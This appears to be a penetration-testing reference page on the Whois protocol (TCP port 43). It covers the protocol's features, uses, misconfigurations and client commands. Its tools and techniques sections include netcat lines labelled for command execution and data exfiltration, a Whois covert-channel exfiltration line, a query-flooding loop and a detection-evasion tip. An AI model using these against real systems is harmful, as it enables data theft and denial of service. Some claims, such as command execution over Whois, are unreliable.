# Index
- [[Ports, Protocols, and Services]]

# Whois

- **Port Number:** 43
- **Protocol:** TCP
- **Service Name:** Whois
- **Defined in:** RFC 3912

Whois is a query and response protocol widely used for querying databases that store information about registered domain names, IP address blocks, and autonomous systems. It was initially designed to provide human-readable details about the owners of various internet resources. The protocol allows users to retrieve contact information, registration dates, nameservers, and other administrative details associated with a domain or IP address.

## Overview of Features

- **Human-Readable Format:** Whois queries return results in a simple, text-based format that is easy for humans to read and interpret.
  
- **TCP-Based:** Whois operates over TCP on port 43, ensuring reliable communication and data transmission between clients and servers.

- **Decentralized Database:** The Whois data is stored in a decentralized manner, with different registries and organizations managing their own databases. For example, domain names are managed by registrars, while IP addresses and autonomous systems are managed by Regional Internet Registries (RIRs).

- **Hierarchical Query Structure:** Whois supports hierarchical queries, where a query may be passed from one Whois server to another until the appropriate server with the relevant information is found.

- **Wide Range of Data:** Whois can return a variety of data, including domain ownership details, IP allocation, nameservers, and even contact information for technical and administrative personnel.

- **Extensible and Adaptable:** While originally designed for domain name information, Whois has been adapted to serve other purposes, such as querying information about autonomous systems and IP address blocks.

## Typical Use Cases

- **Domain Name Ownership:** Determine the registrant of a domain name, including contact details, registration date, and expiration date.

- **IP Address Information:** Identify the organization that owns a specific IP address or IP range, including details on allocation and routing.

- **Cybersecurity Investigations:** Trace ownership and administrative information for domains and IP addresses involved in suspicious activities, helping in attribution and threat analysis.

- **Network Administration:** Network administrators use Whois to verify domain ownership, check the availability of domain names, and resolve issues related to IP address management.

- **Legal and Compliance:** Legal professionals may use Whois to gather evidence in cases of domain disputes, intellectual property infringement, or cybercrime investigations.

## How Whois Protocol Works

1. **Client Query:**
   - **Step 1:** A user initiates a Whois query by connecting to a Whois server over TCP port 43.
   - **Step 2:** The client sends a query string, typically consisting of a domain name or IP address, to the server.
   - **Step 3:** The query is sent in plain text format, without any authentication or encryption.

2. **Server Processing:**
   - **Step 4:** The Whois server receives the query and searches its database for matching records.
   - **Step 5:** If the server does not have the relevant information, it may redirect the query to another Whois server better suited to provide the data.

3. **Response:**
   - **Step 6:** The server compiles the relevant information into a human-readable text format.
   - **Step 7:** The response is sent back to the client over the established TCP connection.
   - **Step 8:** The client displays the information to the user, typically in the terminal or via a dedicated Whois client.

4. **Query Redirection:**
   - **Step 9:** In cases where the initial Whois server does not hold the requested data, the query may be redirected to another server in a hierarchical manner until the appropriate data source is found.

### Diagram (Hypothetical Example):
- **Client:** `<attack_ip>` sends a query for `example.com` to the Whois server at `<target_ip>:43`.
- **Server:** `<target_ip>` processes the query, finds the relevant information, and returns it to `<attack_ip>`.

# Additional Information

## Security Considerations
- **No Authentication:** Whois queries are unauthenticated, meaning anyone can query a Whois server without providing credentials. This can lead to privacy concerns, as personal information associated with domain registrations can be exposed.

- **Lack of Encryption:** Whois queries and responses are transmitted in plaintext, making them vulnerable to interception and eavesdropping by attackers.

- **Data Privacy Regulations:** Due to privacy concerns and regulations like GDPR, the amount of information returned by Whois queries has been reduced in many regions. Some details, such as personal contact information, may be redacted or require additional steps to access.

## Alternatives
- **RDAP (Registration Data Access Protocol):** RDAP is a modern alternative to Whois, designed to address some of the protocol's limitations, such as lack of structured data and support for authentication and access control. RDAP provides JSON-formatted responses and is designed with privacy regulations in mind.

- **Private Whois Services:** Many domain registrars offer private Whois services, where the registrant's personal information is hidden and replaced with the registrar's contact details.

## Advanced Usage
- **Batch Queries:** Some Whois clients support batch querying, where multiple domains or IP addresses can be queried in a single session, useful for large-scale investigations or audits.

- **Custom Parsing:** Advanced users may write scripts to parse Whois data, extracting specific fields of interest such as registration dates or nameserver details.

## Modes of Operation
- **Interactive Mode:** Most Whois clients operate in an interactive mode, where users input queries one at a time and receive immediate responses.
  
- **Automated Scripts:** Scripts can automate the querying process, enabling the continuous monitoring of domain registrations or changes in IP allocations.

## Common Whois Databases

|**Database**|**Description**|
|-|-|
| ARIN         | American Registry for Internet Numbers, covering North America                                        |
| RIPE NCC     | Réseaux IP Européens Network Coordination Centre, covering Europe, the Middle East, and parts of Asia |
| APNIC        | Asia-Pacific Network Information Centre, covering the Asia-Pacific region                             |
| LACNIC       | Latin American and Caribbean Internet Addresses Registry, covering Latin America and the Caribbean    |
| AFRINIC      | African Network Information Centre, covering Africa                                                   |
| Verisign     | Operates the authoritative Whois for .com and .net domains                                            |
| ICANN        | Internet Corporation for Assigned Names and Numbers, overseeing the global domain name system         |

## Configuration Files

Whois does not typically require specific configuration files on the client side. However, the server-side configuration might involve setting up databases, query forwarding rules, and access controls. For instance:

1. **Server Configuration:**
  - **File Location:** `/etc/whois.conf` (Hypothetical example; actual paths may vary based on the software and OS)
  - **Configuration Example:**
    ```bash
    forward-queries-to: whois.arin.net
    database: /var/lib/whois/db
    access-control: allow all
    ```
  - **Key Settings:**
    - `forward-queries-to`: Specifies the server to forward queries if the local server does not have the requested information.
    - `database`: Path to the local Whois database.
    - `access-control`: Rules governing who can access the Whois service.

## Potential Misconfigurations

1. **Open Whois Server:**
   - **Risk:** A publicly accessible Whois server with no access controls may expose sensitive information, making it an easy target for information harvesting by attackers.
   - **Exploitation:** Attackers can use automated tools to scrape data from the server, potentially leading to data leaks or aiding in social engineering attacks.

2. **Lack of Rate Limiting:**
   - **Risk:** Without rate limiting, a Whois server can be overwhelmed by a high volume of queries, leading to denial of service (DoS) or enabling mass data scraping.
   - **Exploitation:** Attackers can perform a DoS attack or use the server to perform large-scale data mining operations.

3. **Misconfigured Query Forwarding:**
   - **Risk:** If query forwarding is not correctly configured, queries may not reach the correct server, leading to incomplete or incorrect data being returned.
   - **Exploitation:** Users may receive inaccurate information, leading to incorrect decisions based on incomplete data.

## Default Credentials

Whois does not use authentication, so there are no default credentials associated with it.

# Interaction and Tools

## Tools

### [[Whois]]
- **Single Domain Query:** Retrieves Whois information for the domain `example.com`.
	```bash
	whois example.com
	```
- **Single SubDomain Query:** Retrieves Whois information for the domain `example.com`.
	```bash
	whois subdomain.example.com
	```
- **Single IP Address Query:** Retrieves Whois information for the IP address `192.0.2.1`.
	```bash
	whois 192.0.2.1
	```
- **Query Specific Whois Server:** Queries the ARIN Whois server specifically for information on `192.0.2.1`.
	```bash
	whois -h whois.arin.net 192.0.2.1
	```
- **Query for Domain Availability:** Checks if the domain `example.com` is available for registration.
	```bash
	whois example.com | grep -i "No match for"
	```
- **Chaining Queries:** Performing successive queries on different Whois servers, as some domains might be registered through different registries, each with its own Whois server.
	```bash
	whois -h whois.verisign-grs.com example.com
	```
- **Batch Domain Query:** Queries Whois information for multiple domains in one script.
    ```bash
    for domain in example.com example.net example.org; do whois $domain; done
    ```
- **Custom Parsing (Using `grep`):** Extracts specific information from the Whois output, such as the registrar and creation date.
    ```bash
    whois example.com | grep 'Registrar\|Creation Date'
    ```
- **Save Output to File:** Saves the output of the Whois query to a text file for later analysis.
    ```bash
    whois example.com > whois_example.txt
    ```

### Online Whois Tools

|**Site**|**URL**|
|  |  |
| Whois Lookup | [https://www.whois.com/whois/](https://www.whois.com/whois/) |
| ICANN Lookup | [https://lookup.icann.org/](https://lookup.icann.org/) |
| Domain Big Data | [https://domainbigdata.com](https://domainbigdata.com)|
| Whois.DomainTools | [https://whois.domaintools.com](https://whois.domaintools.com) |
| WhoIs IP          | [https://www.ultratools.com/tools/ipWhoisLookup](https://www.ultratools.com/tools/ipWhoisLookup) |
| IP2Location       | [https://www.ip2location.com](https://www.ip2location.com) |
| Whoisology        | [https://whoisology.com](https://whoisology.com)  |
| Whoxy             | [https://whoxy.com](https://whoxy.com)  |

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 43"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 43
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 43
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 43 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 43
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 43 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple test to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:43
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 43 -c 1
    ```
## Other Techniques

### Python Whois Libraries
- **Description:** Python libraries like `python-whois` can be used to automate Whois lookups and parse results programmatically.
- **Example Code:**
    ```python
    import whois
    domain = whois.whois('example.com')
    print(domain.expiration_date)
    ```
- **Use Case:** Automate and integrate Whois queries into larger security tools or scripts.

### Custom Scripts
- **Description:** Scripts can be written to interact with Whois servers, parse data, and store results for further analysis.
- **Example Script:**
    ```bash
    for domain in $(cat domains.txt); do whois $domain | grep 'Registrar\|Creation Date'; done
    ```
- **Use Case:** Large-scale domain analysis or monitoring changes in domain registration data.

### WHOIS API Integration
- **Description:** Integration of WHOIS queries into custom applications via WHOIS APIs, allowing automated and large-scale querying.
- **Example:**
	```bash
	import requests
	response = requests.get("https://api.whoisxmlapi.com/v1?apiKey=YOUR_API_KEY&domainName=example.com")
	print(response.json())
	```
- **Use Case:** Incorporating WHOIS data into automated systems or dashboards for continuous monitoring.

# Penetration Testing Techniques

## External Reconnaissance

### Domain Ownership Lookup
- **Tool:** [[Whois]]
    ```bash
    whois example.com
    ```
- **Description:** Identify the owner of a domain, including contact information, to understand the administrative structure of a target.

### IP Address Attribution
- **Tool:** [[Whois]]
    ```bash
    whois 192.0.2.1
    ```
- **Description:** Determine the organization responsible for a particular IP address, which can help in identifying the target's network infrastructure.

## Internal Reconnaissance

### Mapping Internal Domains
- **Tool:** [[Whois]]
    ```bash
    whois internal.example.com
    ```
- **Description:** If internal domains are publicly registered, Whois can be used to gather information about the internal network structure and key contacts.

## Defense Evasion

### Abusing Open Whois Servers
- **Tool:** [[Whois]]
    ```bash
    whois -h <open_whois_server> example.com
    ```
- **Description:** Use open Whois servers that do not log queries to evade detection while gathering information.

## Data Exfiltration

### WHOIS as a Covert Channel
- **Tool:** [[Custom Scripts]]
	```bash
	echo "data_to_exfiltrate" | nc whois.example.com 43
	```
- **Description:** (Hypothetical) Leverage WHOIS queries as a method to exfiltrate small amounts of data, using the WHOIS server as a relay.

# Exploits and Attacks

## Denial of Service

### Flooding Whois Servers
- **Tool:** [[Custom Scripts]]
    ```bash
    while true; do whois example.com; done
    ```
- **Description:** Continuously query a Whois server to consume its resources and potentially cause a denial of service.

# Resources

|**Website**|**URL**|
|-|-|
|RFC 3912|https://tools.ietf.org/html/rfc3912|
|Whois.net|https://www.whois.net/|
|ICANN Whois Lookup|https://lookup.icann.org/|
|ARIN Whois|https://www.arin.net/resources/registry/whois/rws/|
|RIPE Whois|https://www.ripe.net/manage-ips-and-asns/db/tools/whois|
|APNIC Whois|https://wq.apnic.net/static/search.html|
|LACNIC Whois|https://www.lacnic.net/2920/2/lacnic/whois|
|Python-whois Documentation|https://pypi.org/project/python-whois/|
|Linux man-pages|https://man7.org/linux/man-pages/|
|RDAP (Registration Data Access Protocol)|https://www.iana.org/assignments/rdap/rdap.xhtml|